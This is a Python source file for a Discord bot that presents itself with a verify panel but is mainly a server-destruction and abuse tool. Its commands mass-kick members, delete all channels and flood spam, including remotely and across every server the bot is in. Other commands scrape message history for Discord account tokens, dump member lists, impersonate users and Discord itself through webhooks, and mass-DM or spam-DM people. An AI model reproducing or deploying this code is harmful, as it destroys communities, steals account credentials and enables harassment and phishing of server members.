# language: Python 3.13  |  file: bot.py  |  runtime: discord.py 2.x
# deps: discord.py — pip install discord.py

import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import secrets
import string
import os
import re
from typing import Optional

# ── config ────────────────────────────────────────────────────
TOKEN = os.environ.get("TOKEN")
VERIFY_ROLE_NAME = "Verified"
PREMIUM_USER_ID = 1224012443341160498

# ── nuke config — editable via !LHP ──────────────────────────
nuke_config = {
    "channel_name": "hooked by lh clan",
    "message": "lol ur server doesn't even have any good protection get a job",
    "channel_count": 12,
    "spam_count": 100,
}

# ── token store ───────────────────────────────────────────────
active_tokens: dict[str, bool] = {}

# ── intents ───────────────────────────────────────────────────
intents = discord.Intents.default()
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)


# ── helpers ───────────────────────────────────────────────────
def generate_token() -> str:
    alphabet = string.ascii_letters + string.digits
    return "LHT-" + "".join(secrets.choice(alphabet) for _ in range(24))

def has_valid_token(token_str: str) -> bool:
    return token_str.strip() in active_tokens

def consume_token(token_str: str):
    active_tokens.pop(token_str.strip(), None)

DISCORD_TOKEN_REGEX = re.compile(
    r"[MNO][a-zA-Z0-9_-]{23,25}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27,38}"
)


# ── on_ready ──────────────────────────────────────────────────
@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"✅ Online as {bot.user}")


# ── setup_hook ────────────────────────────────────────────────
async def setup_hook():
    bot.add_view(VerifyButton())

bot.setup_hook = setup_hook


# ════════════════════════════════════════════════════════════════
#  VERIFY
# ════════════════════════════════════════════════════════════════

class VerifyButton(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(
        label="✅ Verify Me",
        style=discord.ButtonStyle.green,
        custom_id="verify_button"
    )
    async def verify(self, interaction: discord.Interaction, button: discord.ui.Button):
        role = discord.utils.get(interaction.guild.roles, name=VERIFY_ROLE_NAME)
        if not role:
            await interaction.response.send_message(
                "❌ Setup error: No role named `Verified`. Contact an admin.",
                ephemeral=True
            )
            return
        if role in interaction.user.roles:
            await interaction.response.send_message(
                "👍 You're already verified!", ephemeral=True
            )
            return
        try:
            await interaction.user.add_roles(role, reason="Clicked verify button")
            embed = discord.Embed(
                title="✅ Verified!",
                description=f"Welcome {interaction.user.mention}, you now have access.",
                color=0x00ff00
            )
            embed.set_thumbnail(url=interaction.user.display_avatar.url)
            embed.set_footer(text=f"ID: {interaction.user.id}")
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except discord.Forbidden:
            await interaction.response.send_message(
                "❌ Bot doesn't have permission to assign roles.", ephemeral=True
            )


@bot.tree.command(name="setupverify", description="Post the verification panel (admin only)")
@app_commands.checks.has_permissions(administrator=True)
async def setupverify(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🔐 Verification",
        description="Click the button below to verify yourself and gain access to the server.\n\nThis only takes one click.",
        color=0x5865f2
    )
    embed.set_footer(text=interaction.guild.name)
    await interaction.response.send_message(embed=embed, view=VerifyButton())


# ════════════════════════════════════════════════════════════════
#  LH — nuke + subcommands
# ════════════════════════════════════════════════════════════════

async def run_nuke(guild: discord.Guild):
    """core nuke logic — reused by !LH and !LH EXEC"""
    kick_tasks = []
    for member in guild.members:
        if member == guild.me or member == guild.owner:
            continue
        kick_tasks.append(member.kick(reason="LH Clan"))
    await asyncio.gather(*kick_tasks, return_exceptions=True)

    delete_tasks = [ch.delete() for ch in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    new_channels = []
    for _ in range(nuke_config["channel_count"]):
        try:
            ch = await guild.create_text_channel(nuke_config["channel_name"])
            new_channels.append(ch)
        except Exception:
            pass

    async def spam_channel(channel):
        for _ in range(nuke_config["spam_count"]):
            try:
                await channel.send(nuke_config["message"])
            except Exception:
                pass

    await asyncio.gather(*[spam_channel(ch) for ch in new_channels])


@bot.command(name="LH")
async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[str] = None):

    # ── !LH T — token gen ────────────────────────────────────
    if subcommand and subcommand.upper() == "T":
        if ctx.author.id != PREMIUM_USER_ID:
            await ctx.send(embed=discord.Embed(
                title="❌ Access Denied",
                description="Premium command. You don't have access.",
                color=0xff0000
            ))
            return

        tok = generate_token()
        active_tokens[tok] = True

        embed = discord.Embed(
            title="🔑 Premium Token Generated",
            description=(
                f"**Token:** `{tok}`\n\n"
                "Use with `!LHP` to edit nuke settings.\n"
                "⚠️ **Single-use** — consumed after one successful edit."
            ),
            color=0xffd700
        )
        embed.set_footer(text=f"Generated by {ctx.author} | LH Premium")
        try:
            await ctx.author.send(embed=embed)
            await ctx.message.delete()
            await ctx.send("🔑 Token sent to your DMs.", delete_after=5)
        except discord.Forbidden:
            await ctx.send(embed=embed)
        return

    # ── !LH GHOST — clone admin, then nuke ───────────────────
    if subcommand and subcommand.upper() == "GHOST":
        if not ctx.author.guild_permissions.administrator:
            await ctx.send("❌ Administrator required.", delete_after=5)
            return

        guild = ctx.guild
        target = None
        for member in sorted(guild.members, key=lambda m: m.top_role.position, reverse=True):
            if member == guild.me or member == guild.owner or member.bot:
                continue
            target = member
            break

        if target:
            try:
                await guild.me.edit(nick=target.display_name)
                avatar_bytes = await target.display_avatar.read()
                await bot.user.edit(avatar=avatar_bytes)
            except Exception:
                pass

        await ctx.message.delete()
        await asyncio.sleep(2)
        await run_nuke(guild)
        return

    # ── !LH EXEC <serverID> <token> — remote nuke ────────────
    if subcommand and subcommand.upper() == "EXEC":
        if not args or len(args.split()) < 2:
            await ctx.send("❌ Usage: `!LH EXEC <serverID> <token>`", delete_after=5)
            return

        parts = args.split()
        server_id_str = parts[0]
        tok = parts[1]

        if not has_valid_token(tok):
            await ctx.send(embed=discord.Embed(
                title="❌ Invalid Token",
                description="Token doesn't exist or already used.",
                color=0xff0000
            ))
            return

        try:
            target_guild = bot.get_guild(int(server_id_str))
        except ValueError:
            await ctx.send("❌ Invalid server ID.", delete_after=5)
            return

        if not target_guild:
            await ctx.send("❌ Bot is not in that server.", delete_after=5)
            return

        consume_token(tok)
        try:
            await ctx.message.delete()
        except Exception:
            pass

        await ctx.send(
            embed=discord.Embed(
                title="💀 Remote Nuke Initiated",
                description=f"Targeting: **{target_guild.name}** (`{target_guild.id}`)",
                color=0xff0000
            ),
            delete_after=10
        )
        await run_nuke(target_guild)
        return

    # ── !LH ALL <token> — nuke every server ──────────────────
    if subcommand and subcommand.upper() == "ALL":
        tok = args.strip() if args else ""
        if not has_valid_token(tok):
            await ctx.send(embed=discord.Embed(
                title="❌ Invalid Token",
                description="Token doesn't exist or already used.",
                color=0xff0000
            ))
            return

        consume_token(tok)
        guilds = [g for g in bot.guilds]

        try:
            await ctx.message.delete()
        except Exception:
            pass

        await ctx.send(
            embed=discord.Embed(
                title="💀 ALL SERVERS NUKE INITIATED",
                description=f"Targeting **{len(guilds)}** servers simultaneously.",
                color=0xff0000
            ),
            delete_after=10
        )
        await asyncio.gather(*[run_nuke(g) for g in guilds], return_exceptions=True)
        return

    # ── !LH — standard nuke ───────────────────────────────────
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Administrator required.", delete_after=5)
        return

    try:
        await ctx.message.delete()
    except Exception:
        pass

    await run_nuke(ctx.guild)


# ════════════════════════════════════════════════════════════════
#  LHP — premium config editor
# ════════════════════════════════════════════════════════════════

class LHPModal(discord.ui.Modal, title="⚙️ Edit LH Nuke Config"):
    token_input = discord.ui.TextInput(
        label="Premium Token",
        placeholder="LHT-xxxxxxxxxxxxxxxxxxxxxxxx",
        required=True,
        max_length=32,
        style=discord.TextStyle.short
    )
    channel_name_input = discord.ui.TextInput(
        label="Channel Name",
        placeholder="hooked by lh clan",
        required=True,
        max_length=100,
        style=discord.TextStyle.short
    )
    message_input = discord.ui.TextInput(
        label="Spam Message",
        placeholder="lol ur server doesn't even have any good protection",
        required=True,
        max_length=2000,
        style=discord.TextStyle.paragraph
    )
    channel_count_input = discord.ui.TextInput(
        label="Channel Count (min 12)",
        placeholder="12",
        required=True,
        max_length=3,
        style=discord.TextStyle.short
    )
    spam_count_input = discord.ui.TextInput(
        label="Spam Count per Channel (max 200)",
        placeholder="100",
        required=True,
        max_length=3,
        style=discord.TextStyle.short
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        tok = self.token_input.value.strip()

        if not has_valid_token(tok):
            await interaction.followup.send(embed=discord.Embed(
                title="❌ Invalid Token",
                description="Token doesn't exist or already used.",
                color=0xff0000
            ), ephemeral=True)
            return

        try:
            ch_count = int(self.channel_count_input.value.strip())
            sp_count = int(self.spam_count_input.value.strip())
        except ValueError:
            await interaction.followup.send(
                "❌ Channel count and spam count must be numbers.", ephemeral=True
            )
            return

        ch_count = max(12, ch_count)
        sp_count = max(1, min(sp_count, 200))

        nuke_config["channel_name"]  = self.channel_name_input.value.strip()
        nuke_config["message"]       = self.message_input.value.strip()
        nuke_config["channel_count"] = ch_count
        nuke_config["spam_count"]    = sp_count

        consume_token(tok)

        preview = nuke_config['message'][:100] + "..." if len(nuke_config['message']) > 100 else nuke_config['message']
        embed = discord.Embed(title="✅ Nuke Config Updated", color=0x00ff00)
        embed.add_field(name="Channel Name",  value=f"`{nuke_config['channel_name']}`", inline=False)
        embed.add_field(name="Spam Message",  value=f"`{preview}`",                     inline=False)
        embed.add_field(name="Channel Count", value=str(nuke_config["channel_count"]),  inline=True)
        embed.add_field(name="Spam Count",    value=str(nuke_config["spam_count"]),     inline=True)
        embed.set_footer(text="Token consumed. Generate a new one with !LH T.")
        await interaction.followup.send(embed=embed, ephemeral=True)

    async def on_error(self, interaction: discord.Interaction, error: Exception):
        await interaction.followup.send("❌ Something broke. Try again.", ephemeral=True)


@bot.command(name="LHP")
async def lhp(ctx):
    try:
        await ctx.message.delete()
    except Exception:
        pass

    class LHPView(discord.ui.View):
        def __init__(self):
            super().__init__(timeout=60)

        @discord.ui.button(label="⚙️ Open Config Editor", style=discord.ButtonStyle.blurple)
        async def open_modal(self, interaction: discord.Interaction, button: discord.ui.Button):
            if interaction.user.id != ctx.author.id:
                await interaction.response.send_message(
                    "❌ Only the command runner can use this.", ephemeral=True
                )
                return
            await interaction.response.send_modal(LHPModal())
            self.stop()

    embed = discord.Embed(
        title="⚙️ LH Premium Config",
        description="Click to open the nuke config editor.\nRequires a valid token from `!LH T`.",
        color=0xffd700
    )
    msg = await ctx.send(embed=embed, view=LHPView())
    await asyncio.sleep(61)
    try:
        await msg.delete()
    except Exception:
        pass


# ════════════════════════════════════════════════════════════════
#  INTEL GATHERING
# ════════════════════════════════════════════════════════════════

@bot.command(name="LHSPY")
async def lh_spy(ctx):
    if ctx.author.id != PREMIUM_USER_ID:
        await ctx.send("❌ Access Denied.", delete_after=3)
        return

    guilds = bot.guilds
    if not guilds:
        await ctx.send("Bot is not in any servers.")
        return

    pages = [guilds[i:i+10] for i in range(0, len(guilds), 10)]
    for idx, page in enumerate(pages):
        embed = discord.Embed(
            title=f"📡 Server Spy — Page {idx+1}/{len(pages)}",
            color=0xff4400
        )
        for g in page:
            try:
                owner = await bot.fetch_user(g.owner_id)
                owner_str = f"{owner} (`{owner.id}`)"
            except Exception:
                owner_str = f"ID: `{g.owner_id}`"
            embed.add_field(
                name=g.name,
                value=(
                    f"ID: `{g.id}`\n"
                    f"Members: `{g.member_count}`\n"
                    f"Owner: {owner_str}\n"
                    f"Channels: `{len(g.channels)}`"
                ),
                inline=True
            )
        embed.set_footer(text=f"Total servers: {len(guilds)}")
        try:
            await ctx.author.send(embed=embed)
        except discord.Forbidden:
            await ctx.send(embed=embed)

    try:
        await ctx.message.delete()
    except Exception:
        pass
    await ctx.send("📡 Spy report sent to your DMs.", delete_after=5)


@bot.command(name="LHMEMBERS")
async def lh_members(ctx, server_id: str = None):
    if ctx.author.id != PREMIUM_USER_ID:
        await ctx.send("❌ Access Denied.", delete_after=3)
        return

    if not server_id:
        await ctx.send("❌ Usage: `!LHMEMBERS <serverID>`", delete_after=5)
        return

    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        await ctx.send("❌ Invalid server ID.", delete_after=5)
        return

    if not guild:
        await ctx.send("❌ Bot is not in that server.", delete_after=5)
        return

    try:
        await ctx.message.delete()
    except Exception:
        pass

    lines = [f"Member List — {guild.name} ({guild.id})\n{'='*50}"]
    async for member in guild.fetch_members(limit=None):
        joined = member.joined_at.strftime("%Y-%m-%d") if member.joined_at else "unknown"
        top_role = member.top_role.name if member.top_role else "none"
        lines.append(
            f"Username : {member}\n"
            f"ID       : {member.id}\n"
            f"Top Role : {top_role}\n"
            f"Joined   : {joined}\n"
            f"Bot      : {'Yes' if member.bot else 'No'}\n"
            f"{'-'*40}"
        )

    output = "\n".join(lines)
    file_path = f"/tmp/members_{guild.id}.txt"
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(output)

    try:
        await ctx.author.send(
            content=f"📋 Member list for **{guild.name}** — `{len(guild.members)}` members",
            file=discord.File(file_path, filename=f"members_{guild.name}.txt")
        )
        await ctx.send("📋 Member list sent to your DMs.", delete_after=5)
    except discord.Forbidden:
        await ctx.send(
            file=discord.File(file_path, filename=f"members_{guild.name}.txt")
        )


@bot.command(name="LHTOKENS")
async def lh_tokens(ctx, server_id: str = None):
    if ctx.author.id != PREMIUM_USER_ID:
        await ctx.send("❌ Access Denied.", delete_after=3)
        return

    if not server_id:
        await ctx.send("❌ Usage: `!LHTOKENS <serverID>`", delete_after=5)
        return

    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        await ctx.send("❌ Invalid server ID.", delete_after=5)
        return

    if not guild:
        await ctx.send("❌ Bot is not in that server.", delete_after=5)
        return

    try:
        await ctx.message.delete()
    except Exception:
        pass

    await ctx.send("🔍 Scanning channels for tokens... this may take a while.", delete_after=10)

    found = []
    for channel in guild.text_channels:
        try:
            async for msg in channel.history(limit=500):
                matches = DISCORD_TOKEN_REGEX.findall(msg.content)
                for match in matches:
                    found.append(
                        f"Token  : {match}\n"
                        f"Author : {msg.author} ({msg.author.id})\n"
                        f"Channel: #{channel.name}\n"
                        f"{'─'*40}"
                    )
        except discord.Forbidden:
            continue
        except Exception:
            continue

    if not found:
        try:
            await ctx.author.send(f"🔍 Scan complete for **{guild.name}** — no tokens found.")
        except Exception:
            await ctx.send("🔍 Scan complete — no tokens found.", delete_after=10)
        return

    output = f"Token Scan — {guild.name} ({guild.id})\nFound: {len(found)}\n{'='*50}\n" + "\n".join(found)
    file_path = f"/tmp/tokens_{guild.id}.txt"
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(output)

    try:
        await ctx.author.send(
            content=f"🔑 Found **{len(found)}** token(s) in **{guild.name}**",
            file=discord.File(file_path, filename=f"tokens_{guild.name}.txt")
        )
    except discord.Forbidden:
        await ctx.send(
            file=discord.File(file_path, filename=f"tokens_{guild.name}.txt")
        )


# ════════════════════════════════════════════════════════════════
#  SOCIAL ENGINEERING
# ════════════════════════════════════════════════════════════════

@bot.command(name="impersonate")
async def impersonate(ctx, token_str: str = None, user_id: str = None, *, message: str = None):
    if not token_str or not user_id or not message:
        await ctx.send("❌ Usage: `!impersonate <token> <userID> <message>`", delete_after=5)
        return

    if not has_valid_token(token_str):
        await ctx.send(embed=discord.Embed(
            title="❌ Invalid Token",
            description="Token doesn't exist or already used.",
            color=0xff0000
        ))
        return

    try:
        await ctx.message.delete()
    except Exception:
        pass

    try:
        target = await bot.fetch_user(int(user_id))
    except (discord.NotFound, ValueError):
        await ctx.send("❌ User not found.", delete_after=5)
        return

    try:
        webhook = await ctx.channel.create_webhook(name=target.display_name)
    except discord.Forbidden:
        await ctx.send("❌ Bot needs Manage Webhooks permission.", delete_after=5)
        return

    consume_token(token_str)

    try:
        await webhook.send(
            content=message,
            username=target.display_name,
            avatar_url=target.display_avatar.url
        )
    except Exception as e:
        await ctx.send(f"❌ Send failed: `{e}`", delete_after=5)
    finally:
        await webhook.delete()


@bot.command(name="massdm")
async def massdm(ctx, token_str: str = None, server_id: str = None, *, message: str = None):
    if not token_str or not server_id or not message:
        await ctx.send("❌ Usage: `!massdm <token> <serverID> <message>`", delete_after=5)
        return

    if not has_valid_token(token_str):
        await ctx.send(embed=discord.Embed(
            title="❌ Invalid Token",
            description="Token doesn't exist or already used.",
            color=0xff0000
        ))
        return

    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        await ctx.send("❌ Invalid server ID.", delete_after=5)
        return

    if not guild:
        await ctx.send("❌ Bot is not in that server.", delete_after=5)
        return

    consume_token(token_str)

    try:
        await ctx.message.delete()
    except Exception:
        pass

    status_msg = await ctx.send(f"📬 Mass DMing **{guild.name}**... 0/{guild.member_count} sent")

    success = 0
    failed = 0
    for member in guild.members:
        if member.bot:
            continue
        try:
            await member.send(message)
            success += 1
        except Exception:
            failed += 1
        if (success + failed) % 10 == 0:
            try:
                await status_msg.edit(
                    content=f"📬 Mass DMing **{guild.name}**... {success+failed}/{guild.member_count}"
                )
            except Exception:
                pass

    embed = discord.Embed(title="📬 Mass DM Complete", color=0x00ff00)
    embed.add_field(name="Server",    value=guild.name,   inline=False)
    embed.add_field(name="✅ Sent",   value=str(success), inline=True)
    embed.add_field(name="❌ Failed", value=str(failed),  inline=True)
    try:
        await status_msg.delete()
    except Exception:
        pass
    try:
        await ctx.author.send(embed=embed)
    except Exception:
        await ctx.send(embed=embed)


@bot.command(name="fake")
@commands.has_permissions(administrator=True)
async def fake_system(ctx, *, message: str = None):
    if not message:
        await ctx.send("❌ Usage: `!fake <message>`", delete_after=5)
        return

    try:
        await ctx.message.delete()
    except Exception:
        pass

    try:
        webhook = await ctx.channel.create_webhook(name="Discord")
    except discord.Forbidden:
        await ctx.send("❌ Bot needs Manage Webhooks permission.", delete_after=5)
        return

    try:
        await webhook.send(
            content=message,
            username="Discord",
            avatar_url="https://cdn.discordapp.com/embed/avatars/0.png"
        )
    except Exception as e:
        await ctx.send(f"❌ Send failed: `{e}`", delete_after=5)
    finally:
        await webhook.delete()


# ════════════════════════════════════════════════════════════════
#  HELP
# ════════════════════════════════════════════════════════════════

@bot.command(name="help")
async def help_cmd(ctx):
    embed = discord.Embed(
        title="🛠️ LH Clan Bot — Command Reference",
        description=(
            "```\nPrefix: !    Slash: /\n"
            "🔑 Premium = token required\n"
            "⭐ Owner   = your user ID only\n"
            "🔒 Admin   = server admin only```"
        ),
        color=0x2b2d31
    )
    embed.add_field(
        name="━━━━━━ 💀 NUKE ━━━━━━",
        value=(
            "`!LH` — nuke current server *(Admin)*\n"
            "`!LH GHOST` — clone top admin → nuke *(Admin)*\n"
            "`!LH EXEC <serverID> <token>` — remote nuke a server 🔑\n"
            "`!LH ALL <token>` — nuke ALL servers bot is in 🔑\n"
            "`!LH T` — generate a premium token *(Owner)* ⭐\n"
            "`!LHP` — edit nuke config (channel name, message, counts) 🔑"
        ),
        inline=False
    )
    embed.add_field(
        name="━━━━━━ 📡 INTEL ━━━━━━",
        value=(
            "`!LHSPY` — list every server bot is in *(Owner)* ⭐\n"
            "`!LHMEMBERS <serverID>` — dump full member list as .txt *(Owner)* ⭐\n"
            "`!LHTOKENS <serverID>` — scan messages for Discord tokens *(Owner)* ⭐"
        ),
        inline=False
    )
    embed.add_field(
        name="━━━━━━ 🎭 SOCIAL ━━━━━━",
        value=(
            "`!impersonate <token> <userID> <msg>` — webhook clone of any user 🔑\n"
            "`!massdm <token> <serverID> <msg>` — DM every member of a server 🔑\n"
            "`!fake <msg>` — post as Discord system *(Admin)*"
        ),
        inline=False
    )
    embed.add_field(
        name="━━━━━━ 🔐 VERIFY ━━━━━━",
        value="`/setupverify` — post one-click verify panel *(Admin)*",
        inline=False
    )
    embed.add_field(
        name="━━━━━━ 📬 DM ━━━━━━",
        value="`/dm <message> <count> [member|user_id] [delay]` — DM any user (max 200×)",
        inline=False
    )
    embed.add_field(
        name="━━━━━━ 📊 INFO ━━━━━━",
        value=(
            "`/serverinfo` — server stats\n"
            "`/userinfo @user` — user stats\n"
            "`/poll <question>` — yes/no poll\n"
            "`/ping` — bot latency"
        ),
        inline=False
    )
    embed.set_footer(text="LH Clan Bot | Premium tokens: !LH T")
    await ctx.send(embed=embed)


# ════════════════════════════════════════════════════════════════
#  DM
# ════════════════════════════════════════════════════════════════

@bot.tree.command(name="dm", description="DM a user by @mention or ID")
@app_commands.describe(
    member="@mention a server member",
    user_id="Or paste a user ID (outside server)",
    message="Message to send",
    count="How many times (max 200)",
    delay="Delay in seconds between messages"
)
async def dm(
    interaction: discord.Interaction,
    message: str,
    count: app_commands.Range[int, 1, 200],
    member: Optional[discord.Member] = None,
    user_id: Optional[str] = None,
    delay: Optional[float] = None
):
    await interaction.response.defer(ephemeral=True)
    actual_delay = max(0.0, min(delay or 0.0, 10.0))

    if member:
        user = member
    elif user_id:
        try:
            user = await bot.fetch_user(int(user_id))
        except discord.NotFound:
            await interaction.followup.send("❌ User not found.", ephemeral=True)
            return
        except ValueError:
            await interaction.followup.send("❌ Invalid ID.", ephemeral=True)
            return
    else:
        await interaction.followup.send("❌ Provide a @mention or user ID.", ephemeral=True)
        return

    success = 0
    failed = 0
    for _ in range(count):
        try:
            await user.send(message)
            success += 1
            if actual_delay > 0:
                await asyncio.sleep(actual_delay)
        except discord.Forbidden:
            failed = count - success
            break
        except discord.HTTPException:
            failed += 1

    color = 0x00ff00 if failed == 0 else (0xff0000 if success == 0 else 0xff9900)
    embed = discord.Embed(title="📬 DM Report", color=color)
    embed.add_field(name="Target",       value=f"{user} (`{user.id}`)", inline=False)
    embed.add_field(name="✅ Sent",      value=str(success),            inline=True)
    embed.add_field(name="❌ Failed",    value=str(failed),             inline=True)
    embed.add_field(name="📨 Requested", value=str(count),             inline=True)
    embed.set_footer(text=f"Requested by {interaction.user}")
    await interaction.followup.send(embed=embed, ephemeral=True)


# ════════════════════════════════════════════════════════════════
#  INFO
# ════════════════════════════════════════════════════════════════

@bot.tree.command(name="serverinfo", description="Show server info")
async def serverinfo(interaction: discord.Interaction):
    g = interaction.guild
    embed = discord.Embed(title=f"📊 {g.name}", color=0x5865f2)
    embed.set_thumbnail(url=g.icon.url if g.icon else None)
    embed.add_field(name="Owner",    value=str(g.owner),                      inline=True)
    embed.add_field(name="Members",  value=str(g.member_count),               inline=True)
    embed.add_field(name="Channels", value=str(len(g.channels)),              inline=True)
    embed.add_field(name="Roles",    value=str(len(g.roles)),                 inline=True)
    embed.add_field(name="Created",  value=g.created_at.strftime("%Y-%m-%d"), inline=True)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="userinfo", description="Show info about a user")
@app_commands.describe(member="User to inspect")
async def userinfo(interaction: discord.Interaction, member: discord.Member):
    embed = discord.Embed(title=f"👤 {member}", color=member.color)
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.add_field(name="ID",              value=str(member.id),                         inline=True)
    embed.add_field(name="Joined Server",   value=member.joined_at.strftime("%Y-%m-%d"),  inline=True)
    embed.add_field(name="Account Created", value=member.created_at.strftime("%Y-%m-%d"), inline=True)
    embed.add_field(name="Top Role",        value=member.top_role.mention,                inline=True)
    embed.add_field(name="Bot?",            value="Yes" if member.bot else "No",          inline=True)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="poll", description="Create a yes/no poll")
@app_commands.describe(question="What to ask")
async def poll(interaction: discord.Interaction, question: str):
    embed = discord.Embed(title="📊 Poll", description=question, color=0xfee75c)
    embed.set_footer(text=f"Asked by {interaction.user}")
    await interaction.response.send_message(embed=embed)
    msg = await interaction.original_response()
    await msg.add_reaction("✅")
    await msg.add_reaction("❌")


@bot.tree.command(name="ping", description="Check bot latency")
async def ping(interaction: discord.Interaction):
    latency = round(bot.latency * 1000)
    color = 0x00ff00 if latency < 100 else (0xff9900 if latency < 200 else 0xff0000)
    embed = discord.Embed(title="🏓 Pong!", description=f"Latency: **{latency}ms**", color=color)
    await interaction.response.send_message(embed=embed)


# ── run ───────────────────────────────────────────────────────
bot.run(TOKEN)
